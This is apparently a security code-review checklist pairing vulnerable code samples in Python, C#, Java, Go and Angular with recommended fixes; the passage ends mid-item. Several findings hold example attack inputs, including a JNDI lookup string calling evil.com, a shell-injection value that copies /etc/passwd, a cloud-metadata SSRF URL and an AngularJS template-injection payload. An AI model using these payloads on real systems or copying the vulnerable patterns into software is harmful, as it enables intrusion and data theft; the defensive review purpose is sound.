description:
Code review identified controller actions or service methods performing sensitive operations without verifying the caller's role or resource ownership.

```python
# Flask — no role check
@app.route("/api/admin/users")
def list_users():
    return jsonify(db.query("SELECT * FROM users"))
# Java/Spring — no @PreAuthorize
@GetMapping("/admin/reports")
public List<Report> getReports() { ... }
# C# — no [Authorize]
[HttpGet("/api/admin/keys")]
public IActionResult GetApiKeys() { ... }
```
Search: find all route/endpoint definitions and cross-reference against middleware/attribute-based auth. Focus on admin, export, delete, and bulk-operation endpoints.

Code review identified a recursive object merge utility that does not block assignment to `__proto__`, `constructor`, or `prototype`, allowing injection onto the global Object prototype.

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);  // no __proto__ check
        } else {
            target[key] = source[key];        // pollutes Object.prototype
        }
    }
}
// Attacker sends: {"__proto__": {"isAdmin": true}}
```
Libraries historically vulnerable: lodash `_.merge` pre-4.17.11, jQuery `$.extend` pre-3.4.0.

recommendations:
Block prototype keys explicitly:
```javascript
for (let key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    // ...
}
```
Update lodash to 4.17.21+.

description:
Code review identified file upload handlers relying solely on client-supplied filename extensions or Content-Type headers, which are trivially spoofable.

```python
# Python — extension check only (spoofable)
if not filename.endswith(('.jpg', '.png')):
    abort(400)
# C# — MIME type from client header, not file content
if (file.ContentType != "image/jpeg"):
    return BadRequest();
```
Additional risks: uploads stored in a web-accessible directory, original filenames preserved (path traversal via `../`), no file size limit.

Code review identified API endpoints using user-supplied IDs to fetch resources without verifying the requesting user owns or has permission to access that resource.

```python
# Python — fetches any user's record
@app.route("/api/invoices/<int:invoice_id>")
def get_invoice(invoice_id):
    return db.query("SELECT * FROM invoices WHERE id=?", (invoice_id,))
    # Missing: WHERE owner_id = current_user.id

# Java
@GetMapping("/documents/{id}")
public Document getDocument(@PathVariable Long id) {
    return documentRepo.findById(id).orElseThrow();  // no ownership check
}
```
Search: endpoints accepting IDs in path/query params — trace to DB query and verify ownership predicate is present.

Code review identified use of `BinaryFormatter` to deserialise data from an untrusted source. BinaryFormatter can instantiate arbitrary .NET types during deserialisation, enabling gadget-chain RCE.

```csharp
// Vulnerable
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(inputStream);

// Also vulnerable
IFormatter fmt = new BinaryFormatter();
MyType t = (MyType)fmt.Deserialize(stream);
```
Search: grep for `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`. These are marked dangerous in .NET 5+ and throw NotSupportedException by default in .NET 9.

recommendations:
Replace with a safe serialiser:
```csharp
// Safe — System.Text.Json
var obj = JsonSerializer.Deserialize<MyType>(json);
```
Set `AppContext.SetSwitch("Switch.System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization", false)` immediately if removal is not yet possible.

description:
Code review identified raw SQL queries constructed by string concatenation with user-supplied values in ADO.NET, Dapper, or Entity Framework raw query methods.

```csharp
// ADO.NET — vulnerable
cmd.CommandText = "SELECT * FROM Users WHERE Username='" + username + "'";
// String interpolation — same risk
cmd.CommandText = $"SELECT * FROM Orders WHERE Id={orderId}";
// EF FromSqlRaw with interpolation — vulnerable
context.Users.FromSqlRaw($"SELECT * WHERE Name='{name}'");
// Dapper with interpolated string — vulnerable
conn.Query($"SELECT * FROM Accounts WHERE Email='{email}'");
```
Search: grep for `CommandText =`, `FromSqlRaw(`, `ExecuteSqlRaw(`, `Query(` or `Execute(` where the argument contains `+` or `$"` with user-derived variables.

recommendations:
Parameterised queries only:
```csharp
// ADO.NET
cmd.Parameters.AddWithValue("@username", username);
// EF — safe
context.Users.FromSqlRaw("SELECT * WHERE Name={0}", name);
// Better — LINQ (no raw SQL needed)
context.Users.Where(u => u.Name == name);
// Dapper
conn.Query("SELECT * FROM Accounts WHERE Email=@email", new { email });
```

description:
Code review identified Process.Start or ProcessStartInfo calls that pass user-controlled input as part of a shell command string.

```csharp
// Vulnerable
Process.Start("cmd.exe", $"/c ping {userInput}");

// Vulnerable — UseShellExecute with user command
var psi = new ProcessStartInfo("cmd.exe", "/c " + userCommand) {
    UseShellExecute = true
};
Process.Start(psi);

// Vulnerable — bash on Linux
Process.Start("/bin/bash", $"-c 'convert {filename} output.png'");
```
Look for: any Process.Start where FileName or Arguments contains user-derived input, or where a shell interpreter is invoked with a user-composed string.

recommendations:
Pass arguments as discrete elements, never as a concatenated shell string:
```csharp
// Safe — no shell, arguments separate
var psi = new ProcessStartInfo("ping") {
    UseShellExecute = false,
    Arguments = "-c 1 " + IPAddress.Parse(userInput).ToString()  // validate first
};
```
Prefer managed .NET libraries over shelling out.

description:
Code review identified XML parsing using XmlDocument, XmlReader, or XPathDocument configured with the default XmlUrlResolver, allowing external entity processing.

```csharp
// Vulnerable — XmlDocument with default resolver (pre .NET 4.5.2)
XmlDocument doc = new XmlDocument();
doc.Load(userXmlStream);

// Vulnerable — explicit unsafe resolver
doc.XmlResolver = new XmlUrlResolver();
doc.LoadXml(xmlString);

// Vulnerable — DtdProcessing.Parse
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Parse
};
```
.NET version note: In .NET 4.5.2+ and .NET Core, XmlDocument.XmlResolver defaults to null (safe), but code that explicitly sets a resolver or uses DtdProcessing.Parse remains vulnerable.

recommendations:
Disable DTD and set XmlResolver to null:
```csharp
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
```

description:
Code review identified ASP.NET MVC controller actions performing state-changing operations (POST/PUT/DELETE) without [ValidateAntiForgeryToken], leaving them vulnerable to CSRF.

```csharp
// Vulnerable
[HttpPost]
public IActionResult TransferFunds(TransferViewModel model)
{
    _service.Transfer(model.FromAccount, model.ToAccount, model.Amount);
    return Ok();
}

// Vulnerable — [AllowAnonymous] + state mutation
[AllowAnonymous]
[HttpPost("/subscribe")]
public IActionResult Subscribe(string email) { ... }
```
Search: find all [HttpPost], [HttpPut], [HttpDelete] actions and verify each has [ValidateAntiForgeryToken] or a global AutoValidateAntiforgeryTokenAttribute.

recommendations:
Apply globally:
```csharp
builder.Services.AddControllersWithViews(options => {
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
});
```
For API endpoints using token-based auth (no cookies), CSRF is not applicable.

description:
Code review identified Newtonsoft.Json configured with TypeNameHandling set to All, Objects, or Auto, enabling gadget-chain RCE equivalent to BinaryFormatter.

```csharp
// Vulnerable — global setting
JsonConvert.DefaultSettings = () => new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
};

// Vulnerable — per-call
var obj = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Objects
});
// Attacker payload: {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, ..."}
```
Search: grep for `TypeNameHandling` — any value other than `None` is dangerous without a strict SerializationBinder.

Code review identified user-controlled input interpolated directly into an LDAP search filter string.

```csharp
// Vulnerable
string filter = "(&(objectClass=user)(sAMAccountName=" + username + "))";
DirectorySearcher searcher = new DirectorySearcher(entry, filter);
// Attacker input: *)(uid=*)(\00

// Vulnerable — interpolation
searcher.Filter = $"(mail={userEmail})";
```
Search: grep for `DirectorySearcher`, `DirectoryEntry.Filter`, `LdapConnection.Search` where filter strings contain `+` or `$"` with user-derived values.

Code review identified Path.Combine used with user-supplied input. A critical .NET-specific behaviour: if any component passed to Path.Combine is an absolute path, all preceding components are discarded.

```csharp
// Vulnerable — Path.Combine does NOT prevent absolute path injection
string basePath = @"C:\app\uploads";
string filePath = Path.Combine(basePath, userInput);
// userInput = @"C:\Windows\System32\drivers\etc\hosts"
// filePath becomes: C:\Windows\System32\drivers\etc\hosts  (basePath discarded!)

// Also vulnerable — traversal sequences
// userInput = "..\..\web.config"
```
This behaviour is widely misunderstood — developers assume Path.Combine sanitises input.

recommendations:
Canonicalise and assert containment:
```csharp
string basePath = Path.GetFullPath(@"C:\app\uploads");
string fullPath = Path.GetFullPath(Path.Combine(basePath, userInput));
if (!fullPath.StartsWith(basePath + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase))
    throw new UnauthorizedAccessException();
```

description:
Code review identified ASP.NET controller actions handling sensitive operations without [Authorize] attributes, not covered by a global authorisation filter.

```csharp
// Vulnerable — [AllowAnonymous] at controller level, sensitive actions not individually guarded
[AllowAnonymous]
public class AccountController : Controller
{
    public IActionResult Profile() { ... }    // fine
    public IActionResult AdminPanel() { ... } // BUG — no auth
    public IActionResult ExportData() { ... } // BUG — no auth
}

// Vulnerable — missing Roles restriction
[Authorize]
public class AdminController : Controller
{
    [HttpPost]
    public IActionResult DeleteUser(int id) { ... }  // any authenticated user
}
```

Code review identified broken or weak cryptographic primitives in security-sensitive operations.

```csharp
// Vulnerable — MD5 for password hashing
using var md5 = MD5.Create();
byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(password));

// Vulnerable — SHA1
using var sha1 = SHA1.Create();

// Vulnerable — DES (56-bit key)
using var des = DES.Create();

// Vulnerable — ECB mode (deterministic, leaks patterns)
aes.Mode = CipherMode.ECB;
```

recommendations:
For password hashing use BCrypt.Net or PBKDF2:
```csharp
string hash = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
// AES-GCM — safe
using var aesGcm = new AesGcm(key);
aesGcm.Encrypt(nonce, plaintext, ciphertext, tag);
```

description:
Code review identified database connection strings, JWT signing keys, or API secrets hardcoded in configuration files tracked by version control.

```json
// appsettings.json — vulnerable
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=prod-sql;Password=P@ssw0rd123;"
  },
  "Jwt": { "Secret": "my_super_secret_jwt_key_here" },
  "Stripe": { "SecretKey": "sk_live_abc123..." }
}
```
Search: review all committed config files for `Secret`, `ApiKey`, `Password`, `Token` keys with non-placeholder values. Check .gitignore excludes appsettings.Production.json.

recommendations:
Use .NET User Secrets for dev and Azure Key Vault / AWS Secrets Manager for prod:
```csharp
// Program.cs
if (builder.Environment.IsProduction())
    builder.Configuration.AddAzureKeyVault(new Uri(vaultUri), new DefaultAzureCredential());
```

description:
Code review identified ObjectInputStream.readObject() used to deserialise data from an untrusted or network-facing source. Java native deserialisation executes arbitrary code through gadget chains in common libraries.

```java
// Vulnerable
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();

// Vulnerable — HTTP endpoint
@PostMapping("/api/data")
public Object importData(@RequestBody byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    return ois.readObject();  // RCE if gadgets present on classpath
}
```
Search: grep for `ObjectInputStream`, `readObject()`, `readUnshared()` — trace the stream source.

recommendations:
Replace with JSON (Jackson, Gson) or protobuf. If ObjectInputStream cannot be removed, implement a type allowlist filter:
```java
ois.setObjectInputFilter(info -> {
    if (ALLOWED_CLASSES.contains(info.serialClass().getName()))
        return ObjectInputFilter.Status.ALLOWED;
    return ObjectInputFilter.Status.REJECTED;
});
```

description:
Code review identified SQL queries constructed by string concatenation of user-supplied values in JDBC Statement calls or JPA native queries.

```java
// Vulnerable — JDBC Statement
String query = "SELECT * FROM users WHERE username='" + username + "'";
stmt.executeQuery(query);

// Vulnerable — JPA native query
entityManager.createNativeQuery(
    "SELECT * FROM accounts WHERE owner='" + owner + "'"
).getResultList();

// Vulnerable — Spring JdbcTemplate
jdbcTemplate.query("SELECT * FROM orders WHERE customer=" + customerId, rowMapper);
```

recommendations:
Use PreparedStatement or named parameters:
```java
// JDBC
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE username=?");
ps.setString(1, username);
// JPA
entityManager.createQuery("SELECT u FROM User u WHERE u.username = :name")
             .setParameter("name", username).getResultList();
// JdbcTemplate
jdbcTemplate.query("SELECT * FROM orders WHERE customer=?", rowMapper, customerId);
```

description:
Code review identified XML parsing using DocumentBuilderFactory, SAXParserFactory, or XMLInputFactory with default settings that permit external entity processing.

```java
// Vulnerable — default DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();  // external entities on by default
Document doc = db.parse(userInputStream);

// Vulnerable — SAXParserFactory default
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser sp = spf.newSAXParser();
sp.parse(userInputStream, handler);
```
Search: instantiations of DocumentBuilderFactory, SAXParserFactory, XMLInputFactory, TransformerFactory — verify FEATURE_SECURE_PROCESSING or entity-disabling features are set.

recommendations:
Disable external entities on each factory:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

description:
Code review identified OS command execution via Runtime.exec() or ProcessBuilder where user-controlled input is included without validation.

```java
// Vulnerable — Runtime.exec with shell and user input
Runtime.getRuntime().exec("cmd /c ping " + userInput);

// Vulnerable — shell wrapping
String[] cmd = {"/bin/sh", "-c", "convert " + filename + " output.png"};
Runtime.getRuntime().exec(cmd);
```
Search: grep for `Runtime.getRuntime().exec(`, `new ProcessBuilder(` — trace any argument containing user-derived data.

recommendations:
Use ProcessBuilder with a strict argument array and validate input:
```java
if (!userInput.matches("^[0-9.]+$")) throw new IllegalArgumentException();
new ProcessBuilder("ping", "-c", "1", userInput).start();
```
Prefer native Java libraries over spawning OS processes.

description:
Code review identified user-controlled data passed to a Log4j logger in an application using log4j-core < 2.17.1, or custom JNDI lookup handling resolving URLs from user-supplied strings.

```java
// Vulnerable — logging user input with vulnerable log4j
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
logger.error("Login failed for: " + username);
// If username = "${jndi:ldap://evil.com/a}" → outbound JNDI lookup → RCE
```
Search: Check pom.xml / build.gradle for `log4j-core` version. Any version < 2.17.1 is vulnerable. Also grep for `InitialContext.lookup(userInput)` patterns.

Code review identified user-controlled input evaluated by the Spring SpEL engine, enabling RCE via SpEL's ability to invoke Java methods.

```java
// Vulnerable
ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression(userInput);  // RCE
Object result = expr.getValue();
// Attacker: T(Runtime).getRuntime().exec("id")
```
Search: grep for `SpelExpressionParser`, `parseExpression(`, `StandardEvaluationContext` — trace whether expression strings contain user-derived data.

recommendations:
Never evaluate user input as SpEL. If dynamic expressions are required, use SimpleEvaluationContext which restricts Java type access:
```java
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
Expression expr = parser.parseExpression(userExpression);
```

description:
Code review identified Spring MVC controllers binding request parameters directly to domain objects without restricting which fields may be populated.

```java
// Vulnerable — binds ALL fields including isAdmin, role, balance
@PostMapping("/profile/update")
public ResponseEntity<?> updateProfile(@ModelAttribute User user) {
    userRepository.save(user);  // attacker sends: {"isAdmin":true,"role":"ADMIN"}
}

// Vulnerable
@PostMapping("/orders")
public Order createOrder(@RequestBody Order order) {
    // attacker sets order.price = 0.01, order.status = "paid"
    return orderRepo.save(order);
}
```

recommendations:
Use DTOs that expose only fields users are permitted to set:
```java
@PostMapping("/profile/update")
public ResponseEntity<?> updateProfile(@RequestBody @Valid UpdateProfileDTO dto) {
    User user = userRepo.findById(currentUserId);
    user.setName(dto.getName());
    user.setEmail(dto.getEmail());
    // isAdmin, role never touched
    userRepo.save(user);
}
```

Replace with SecureRandom:
```java
SecureRandom sr = new SecureRandom();
byte[] tokenBytes = new byte[32];
sr.nextBytes(tokenBytes);
String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
```

description:
Code review identified a custom X509TrustManager with empty checkClientTrusted / checkServerTrusted methods, disabling TLS certificate validation entirely.

```java
// Vulnerable — trust-all TrustManager (common copy-paste from StackOverflow)
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() { return null; }
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
    }
};

// Vulnerable — HostnameVerifier approving all
HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
```
Search: grep for `X509TrustManager`, `ALLOW_ALL_HOSTNAME_VERIFIER`, `NoopHostnameVerifier`.

Code review identified Spring service methods performing privileged operations without @PreAuthorize, @Secured, or @RolesAllowed annotations, relying solely on URL-based security rules that may be incomplete.

```java
// Vulnerable — no method-level auth
@Service
public class AdminService {
    public List<User> getAllUsers() { ... }   // no @PreAuthorize
    public void deleteUser(Long id) { ... }  // no @PreAuthorize
}

// URL security that may miss internal calls
http.authorizeRequests().antMatchers("/api/admin/**").hasRole("ADMIN")
// but direct service calls or alternative endpoints bypass this
```

recommendations:
Enable @EnableMethodSecurity and apply @PreAuthorize at the service layer:
```java
@Service
public class AdminService {
    @PreAuthorize("hasRole('ADMIN')")
    public List<User> getAllUsers() { ... }
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(Long id) { ... }
}
```

Use placeholder parameters:
```go
// Safe — parameterised
rows, err := db.QueryContext(ctx, "SELECT * FROM users WHERE username=?", username)

// For table names — use an allowlist
allowedTables := map[string]bool{"users": true, "orders": true}
if !allowedTables[tableName] {
    return nil, errors.New("invalid table name")
}
query := fmt.Sprintf("SELECT * FROM %s WHERE owner=?", tableName)
```

description:
Code review identified HTTP clients configured with InsecureSkipVerify: true in tls.Config, disabling TLS certificate chain and hostname validation.

```go
// Vulnerable
tr := &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}
client := &http.Client{Transport: tr}

// Vulnerable — custom DialTLS
conn, err := tls.Dial("tcp", addr, &tls.Config{
    InsecureSkipVerify: true,
})
```
Search: grep for `InsecureSkipVerify: true` — this string is a reliable indicator with no false positives.

Code review identified concurrent reads and writes to a shared map without mutex protection. Go maps are explicitly documented as not safe for concurrent use — concurrent access causes runtime panics or silent data corruption.

```go
// Vulnerable — shared map accessed from multiple goroutines without lock
var cache = make(map[string][]byte)

func Get(key string) []byte {
    return cache[key]    // concurrent read — DATA RACE
}
func Set(key string, val []byte) {
    cache[key] = val     // concurrent write — DATA RACE
}
// Go runtime: "concurrent map read and map write"
```
The Go race detector (`go test -race`) detects these reliably.

recommendations:
Use sync.RWMutex or sync.Map:
```go
var (
    mu    sync.RWMutex
    cache = make(map[string][]byte)
)
func Get(key string) []byte {
    mu.RLock(); defer mu.RUnlock()
    return cache[key]
}
func Set(key string, val []byte) {
    mu.Lock(); defer mu.Unlock()
    cache[key] = val
}
```
Run `go test -race ./...` in CI.

description:
Code review identified math/rand used to generate security-sensitive values. math/rand is a deterministic PRNG — not suitable for session tokens, password reset codes, or cryptographic keys.

```go
// Vulnerable — math/rand for token generation
import "math/rand"
token := fmt.Sprintf("%d", rand.Int63())   // predictable

// Vulnerable — seeded with time
rand.Seed(time.Now().UnixNano())
sessionID := rand.Int63()

// Vulnerable — random bytes for nonce
buf := make([]byte, 16)
for i := range buf {
    buf[i] = byte(rand.Intn(256))   // not cryptographically random
}
```

recommendations:
Use crypto/rand for all security-sensitive values:
```go
import (
    "crypto/rand"
    "encoding/hex"
)
buf := make([]byte, 32)
if _, err := rand.Read(buf); err != nil { return err }
token := hex.EncodeToString(buf)
```

description:
Code review identified OS command execution where a shell interpreter is invoked with a user-controlled string.

```go
// Vulnerable — shell invoked with user input
cmd := exec.Command("sh", "-c", "convert "+filename+" output.png")
// filename = "a.jpg; cat /etc/passwd > /tmp/leak"

// Vulnerable — bash with interpolated command
cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("ping -c 1 %s", host))
```
When exec.Command is safe: called with a fixed binary path and validated, allowlisted arguments — not shell-wrapped.

recommendations:
Avoid shell wrappers. Use exec.Command with discrete arguments and validate input:
```go
import "net"
if net.ParseIP(userHost) == nil {
    return errors.New("invalid IP address")
}
cmd := exec.Command("ping", "-c", "1", userHost)
```

description:
Code review identified user-controlled input used in filepath.Join to construct file paths, or http.ServeFile serving files without confirming the resolved path remains within the intended root.

```go
// Vulnerable — filepath.Join with user input
func serveFile(w http.ResponseWriter, r *http.Request) {
    filename := r.URL.Query().Get("f")
    path := filepath.Join("/var/uploads", filename)
    // filename = "../../../../etc/passwd"
    http.ServeFile(w, r, path)   // serves /etc/passwd
}
// filepath.Clean is NOT sufficient alone for security
```

Code review identified code paths that spawn goroutines without lifecycle management — no context cancellation, no worker pool limits, no mechanism to detect goroutines that block indefinitely.

```go
// Vulnerable — goroutine per request with no cancellation
func handler(w http.ResponseWriter, r *http.Request) {
    go processInBackground(r.Body)  // no context, no timeout — may block forever
}

// Vulnerable — goroutine reading from channel that may never send
go func() {
    result := <-resultChan  // blocks forever if sender crashes — goroutine leaks
}()

// Vulnerable — unbounded goroutine creation under load
for _, item := range items {
    go process(item)   // 10,000 items = 10,000 goroutines
}
```

recommendations:
Use context for cancellation and worker pools to bound concurrency:
```go
ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
defer cancel()
go processWithContext(ctx, r.Body)

// Bounded worker pool
sem := make(chan struct{}, 10)
for _, item := range items {
    sem <- struct{}{}
    go func(i Item) {
        defer func() { <-sem }()
        process(i)
    }(item)
}
```

description:
Code review identified cryptographic private keys, API secrets, database passwords, or JWT signing keys embedded as string literals or byte slices in Go source files.

```go
// Vulnerable — JWT signing key hardcoded
var jwtSecret = []byte("my_super_secret_jwt_key_hardcoded")

// Vulnerable — database DSN with password
dsn := "postgres://admin:P@ssw0rd@prod-db:5432/app"
db, _ := sql.Open("postgres", dsn)

// Vulnerable — TLS private key as string literal
const privateKeyPEM = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA...`

// Vulnerable — AWS credentials
const awsAccessKey = "AKIAIOSFODNN7EXAMPLE"
```
Search: grep for `-----BEGIN`, `AKIA`, database DSN strings with passwords, variables named `secret`, `key`, `password`, `token` assigned literals.

Code review identified http.Get, http.Post, or custom HTTP client calls where the target URL is composed from user-supplied input without validation.

```go
// Vulnerable — user controls the entire URL
func fetchURL(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    resp, err := http.Get(target)
    // Attacker: http://169.254.169.254/latest/meta-data/ (AWS metadata)
}

// Vulnerable — user controls the hostname
url := fmt.Sprintf("https://%s/avatars/%s.png", host, userID)
resp, err := http.Get(url)   // SSRF via host injection
```
SSRF targets: cloud metadata endpoints (169.254.169.254), internal Kubernetes API (10.96.0.1), localhost services.

recommendations:
Validate the URL against an allowlist of permitted domains:
```go
allowedHosts := map[string]bool{"api.example.com": true}
u, err := url.Parse(targetURL)
if err != nil || !allowedHosts[u.Hostname()] {
    http.Error(w, "Forbidden", 403)
    return
}
resp, err := http.Get(u.String())
```

description:
Code review identified user-controlled data reflected into HTML where AngularJS is active without server-side encoding. AngularJS 1.x evaluates {{ expression }} syntax in the DOM.

```html
<!-- Vulnerable — server renders unescaped user input into AngularJS-bootstrapped page -->
<div ng-app>Hello, {{ username }}!</div>
<!-- username = "{{constructor.constructor('alert(1)')()}}" -->
```
```javascript
// Vulnerable — $compile on user content
$compile('<div>' + userInput + '</div>')($scope);

// Vulnerable — ng-bind-html without $sanitize
$scope.content = userInput;
// <div ng-bind-html="content"></div>
```
Versions affected: AngularJS 1.x only. Angular 2+ is not susceptible in the same way.

Code review identified $sce.trustAsHtml() (AngularJS) or Angular's DomSanitizer.bypassSecurityTrustHtml() called on user-controlled data, explicitly bypassing Angular's built-in XSS sanitisation.

```javascript
// AngularJS — marking user content as trusted
$scope.userBio = $sce.trustAsHtml(user.bio);  // bio may contain <script>
```
```typescript
// Angular — bypassing DomSanitizer
safeContent = this.sanitizer.bypassSecurityTrustHtml(userContent);
// <div [innerHTML]="safeContent"></div>  — renders raw HTML
```
Search: grep for `trustAsHtml(`, `bypassSecurityTrustHtml(`, `bypassSecurityTrustScript(`, `bypassSecurityTrustUrl(`.

Code review identified sensitive API keys, tokens, or secrets stored in Angular's environment.ts / environment.prod.ts. These files are compiled into the JavaScript bundle and served publicly.

```typescript
// src/environments/environment.prod.ts — vulnerable
export const environment = {
  production: true,
  apiKey: 'AIzaSyABC123...',            // visible in browser devtools
  stripeSecretKey: 'sk_live_...',       // CRITICAL — secret key in client bundle
  jwtSecret: 'my_jwt_signing_secret',   // JWT signing key in frontend JS
  dbConnectionString: 'postgres://...'  // DB credential in bundle
};
```
What belongs in environment.ts: truly public config (API base URLs, OAuth client IDs, Stripe PUBLISHABLE keys). NOT: secret keys, private tokens, DB credentials.

Code review identified Angular routes serving content requiring authentication without canActivate or canActivateChild guards.

```typescript
// Vulnerable — no guard on sensitive routes
const routes: Routes = [
  { path: 'dashboard', component: DashboardComponent },        // no guard
  { path: 'admin/users', component: AdminUsersComponent },    // no guard
  { path: 'login', component: LoginComponent }
];

// Guard exists but not applied to all routes
{ path: 'profile', component: ProfileComponent, canActivate: [AuthGuard] },  // guarded
{ path: 'admin', component: AdminComponent },                                 // NOT guarded
```
Critical: Angular route guards are client-side only — they do NOT replace server-side API authorisation.

recommendations:
Use canActivateChild on parent routes to protect subtrees:
```typescript
const routes: Routes = [{
    path: '',
    canActivateChild: [AuthGuard],
    children: [
        { path: 'dashboard', component: DashboardComponent },
        { path: 'admin', component: AdminComponent, canActivate: [AdminGuard] },
    ]
}];
```

description:
Code review identified an Angular application using cookie-based session authentication without HttpClientXsrfModule or a custom interceptor to attach CSRF tokens.

```typescript
// Vulnerable — no XSRF configuration
imports: [
  BrowserModule,
  HttpClientModule,  // no HttpClientXsrfModule
]

// Vulnerable — XSRF configured with wrong names that don't match backend
HttpClientXsrfModule.withOptions({
  cookieName: 'wrong-name',
  headerName: 'Wrong-Header',
})
```

recommendations:
Configure HttpClientXsrfModule with names matching your backend:
```typescript
imports: [
  HttpClientModule,
  HttpClientXsrfModule.withOptions({
    cookieName: 'XSRF-TOKEN',    // match backend Set-Cookie name
    headerName: 'X-XSRF-TOKEN'  // match backend expected header
  })
]
```

description:
Code review identified $rootScope (AngularJS) or Angular shared services storing sensitive user data where it persists beyond its required scope.

```javascript
// AngularJS — sensitive data on $rootScope
angular.module('app').run(function($rootScope, authService) {
    $rootScope.currentUser = {
        creditCardLast4: '4242',  // on $rootScope = globally accessible
        sessionToken: 'eyJ...'    // token in global scope
    };
});
```
```typescript
// Angular — public service property with full PII
@Injectable({ providedIn: 'root' })
export class AuthService {
    public currentUser: User;  // all components access full PII
    public rawToken: string;   // full JWT accessible everywhere
}
```

Code review identified Angular router navigation using a user-controlled returnUrl query parameter as the redirect target after login without validating that the target is an internal application route.

```typescript
// Vulnerable — redirect to user-supplied returnUrl
login() {
    const returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/dashboard';
    this.router.navigateByUrl(returnUrl);  // attacker: ?returnUrl=https://evil.com
}
// Angular router navigates to external URLs given an absolute URL
```

recommendations:
Validate the redirect target is a relative internal path:
```typescript
const returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/dashboard';
const safeUrl = returnUrl.startsWith('/') && !returnUrl.startsWith('//') ? returnUrl : '/dashboard';
this.router.navigateByUrl(safeUrl);
```

description:
Code review identified AngularJS ng-bind-html directives binding user-controlled content with $sce.trustAsHtml bypassing sanitisation.

```html
<div ng-bind-html="trustContent(userComment)"></div>
```
```javascript
// Controller — marking user content as trusted to silence AngularJS $sce error
$scope.trustContent = function(html) {
    return $sce.trustAsHtml(html);   // bypasses all sanitisation
};
```
Search: grep for `ng-bind-html` — check if $sce.trustAsHtml is called on the bound value, or if ngSanitize is absent from module dependencies.

Code review identified access control checks implemented exclusively in Angular (route guards, ngIf directives, button visibility) without corresponding server-side authorisation on API endpoints.

```typescript
// Client-side check only
<button *ngIf="user.role === 'admin'" (click)="deleteUser(id)">Delete</button>
// Attacker calls DELETE /api/users/123 directly — no backend check

// Backend endpoint with no authorisation
@app.route("/api/admin/users/<int:id>", methods=["DELETE"])
def delete_user(id):
    db.execute("DELETE FROM users WHERE id=?", (id,))  # no auth!
```

Code review identified Angular services or utility functions performing recursive object merging without blocking assignment to __proto__, constructor, or prototype keys.

```typescript
// Vulnerable — recursive merge utility
function deepMerge(target: any, source: any): any {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);  // no __proto__ check
        } else {
            target[key] = source[key];  // pollutes Object.prototype
        }
    }
    return target;
}
// Attacker sends: {"__proto__": {"isAdmin": true}}
```

recommendations:
Block prototype keys or use Object.create(null):
```typescript
for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    // ... merge logic
}
// Or: JSON.parse(JSON.stringify(source)) for safe deep clone
```
Use lodash >= 4.17.21 which patches this.

description:
Code review identified the application persisting user credentials, session tokens, or sensitive configuration in cleartext in locally accessible locations.

```csharp
// Vulnerable — SQLite without encryption
using var conn = new SqliteConnection($"Data Source={AppDataPath}/config.db");
cmd.CommandText = "INSERT INTO settings VALUES ('password', '" + password + "')";

// Vulnerable — Windows Registry
Registry.SetValue(@"HKEY_CURRENT_USER\Software\MyApp", "Password", password);

// Vulnerable — plaintext JSON in AppData
File.WriteAllText(configPath, JsonSerializer.Serialize(new {
    ApiToken = token,   // plaintext in AppData\MyApp\config.json
    Password = password
}));
```
Assessment: run strings against the local DB file, extract the Registry hive, inspect AppData directories.

Code review identified the application loading DLLs using relative paths or relying on Windows DLL search order, enabling DLL hijacking by placing a malicious DLL in a user-writable directory.

```csharp
// Vulnerable — relative path (searches CWD first)
[DllImport("version.dll")]
public static extern bool GetFileVersionInfo(...);

// Vulnerable — LoadLibrary with relative path
